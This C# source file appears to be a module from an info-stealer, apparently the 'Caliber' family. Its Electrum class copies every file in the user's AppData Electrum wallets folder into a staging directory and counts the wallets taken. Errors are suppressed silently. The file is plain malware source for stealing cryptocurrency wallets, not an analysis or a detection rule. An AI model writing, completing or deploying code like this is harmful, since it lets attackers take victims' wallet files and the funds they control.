using System.IO;

namespace youknowcaliber
{
    class Electrum
    {
        public static int count = 0;
        public static string ElectrumDir = "\\Wallets\\Electrum\\";

        public static void EleStr(string directorypath) 
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppData + "\\Electrum\\wallets").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + ElectrumDir);
                    file.CopyTo(directorypath + ElectrumDir + file.Name);
                }
                count++;
                Counting.Wallets++;
            }
            catch { return; }
        }
    }
}
